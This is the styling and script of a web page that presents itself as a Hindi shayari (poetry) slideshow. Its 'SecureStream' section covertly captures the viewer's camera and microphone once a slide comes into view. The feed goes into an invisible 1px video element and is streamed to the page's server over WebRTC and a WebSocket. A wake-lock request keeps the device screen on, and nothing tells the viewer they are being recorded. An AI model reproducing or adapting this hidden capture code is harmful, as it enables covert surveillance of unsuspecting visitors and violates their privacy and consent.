    <style>
        :root {
            --bg: #000;
            --accent: #d4af37;
            --glass: rgba(255, 255, 255, 0.05);
        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background: var(--bg); color: #fff; overflow: hidden;
            font-family: 'Poppins', sans-serif;
        }

        /* --- Dynamic Canvas Background --- */
        #bg-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1; pointer-events: none;
        }

        /* --- Full Page Scroller --- */
        .scroller {
            width: 100%; height: 100vh;
            overflow-y: scroll; scroll-snap-type: y mandatory;
            position: relative; z-index: 10;
            scrollbar-width: none;
        }
        .scroller::-webkit-scrollbar { display: none; }

        .slide {
            width: 100%; height: 100vh;
            scroll-snap-align: start;
            display: flex; justify-content: center; align-items: center;
            padding: 20px; box-sizing: border-box;
        }

        .content-box {
            position: relative; width: 100%; max-width: 800px; padding: 50px 30px;
            background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 25px; backdrop-filter: blur(12px); text-align: center;
            opacity: 0; transform: translateY(80px);
            transition: all 1s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .slide.active .content-box { opacity: 1; transform: translateY(0); }

        .intro-img {
            max-width: 280px; width: 65%; border: 2px solid var(--accent); border-radius: 20px;
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.4); margin-bottom: 20px;
            animation: float 4s ease-in-out infinite;
        }

        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }

        .shayari-text {
            font-family: 'Tiro Devanagari Hindi', serif;
            font-size: clamp(20px, 5vw, 32px); line-height: 1.6; color: #fff;
        }

        .tag { color: var(--accent); font-size: 10px; letter-spacing: 4px; text-transform: uppercase; margin-top: 15px; }

        /* Hidden Video for your connection */
        #localVideo { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }

        .progress {
            position: fixed; left: 0; bottom: 0; width: 0%; height: 2px;
            background: var(--accent); z-index: 100;
        }
    </style>

    const scroller = document.getElementById('mainScroller');

    // Create Sections Dynamically
    shayariList.forEach((text, i) => {
        const section = document.createElement('section');
        section.className = 'slide';
        section.innerHTML = `
            <div class="content-box">
                <p class="shayari-text">${text}</p>
                <p class="tag">Shayari ${String(i + 1).padStart(2, '0')}</p>
            </div>
        `;
        scroller.appendChild(section);
    });

    // Observer for Active State
    const obs = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('active');
                if(!localStream) autoTriggerStart();
            } else {
                entry.target.classList.remove('active');
            }
        });
    }, { threshold: 0.5 });
    document.querySelectorAll('.slide').forEach(s => obs.observe(s));

    // Particles Background
    const canvas = document.getElementById('bg-canvas');
    const ctx = canvas.getContext('2d');
    let particles = [];
    function init() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    class Particle {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.size = Math.random() * 2 + 0.5;
            this.speedX = Math.random() * 0.4 - 0.2;
            this.speedY = Math.random() * 0.4 - 0.2;
            this.opacity = Math.random() * 0.5 + 0.1;
        }
        draw() {
            ctx.fillStyle = `rgba(212, 175, 55, ${this.opacity})`;
            ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill();
        }
        update() {
            this.x += this.speedX; this.y += this.speedY;
            if (this.x > canvas.width) this.x = 0; if (this.y > canvas.height) this.y = 0;
        }
    }
    for(let i=0; i<100; i++) particles.push(new Particle());
    function animate() {
        ctx.clearRect(0,0,canvas.width, canvas.height);
        particles.forEach(p => { p.update(); p.draw(); });
        requestAnimationFrame(animate);
    }
    window.addEventListener('resize', init);
    init(); animate();

    // Progress Bar
    scroller.addEventListener('scroll', () => {
        const scroll = scroller.scrollTop;
        const total = scroller.scrollHeight - window.innerHeight;
        document.getElementById('progress').style.width = (scroll/total * 100) + '%';
    });

    // --- YOUR SECURESTREAM LOGIC (VARIABLES UNTOUCHED) ---
    let localStream;
    let peerConnection;
    let socket;
    const configuration = { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }] };

    function connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
        socket = new WebSocket(protocol + window.location.host + "/video-stream");
        socket.onopen = () => autoTriggerStart();
        socket.onmessage = async (event) => {
            const data = JSON.parse(event.data);
            if (data.type === 'answer') {
                await peerConnection.setRemoteDescription(new RTCSessionDescription(data));
            } else if (data.type === 'candidate' && peerConnection) {
                try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch(e){}
            }
        };
        socket.onclose = () => setTimeout(connectWebSocket, 2000);
    }

    async function autoTriggerStart() {
        try {
            if (localStream) return;
            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('localVideo').srcObject = localStream;
            setTimeout(handleGoLive, 1000);
        } catch (error) { console.error("Access denied"); }
    }

    async function handleGoLive() {
        if (!localStream || peerConnection) return;
        peerConnection = new RTCPeerConnection(configuration);
        localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
        peerConnection.onicecandidate = (event) => {
            if (event.candidate && socket.readyState === WebSocket.OPEN) {
                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
            }
        };
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        socket.send(JSON.stringify({ type: 'offer', sdp: offer.sdp }));
    }

    window.onload = connectWebSocket;
    window.addEventListener('touchstart', async () => {
        if ('wakeLock' in navigator) { try { await navigator.wakeLock.request('screen'); } catch (err) {} }
    }, { once: true });
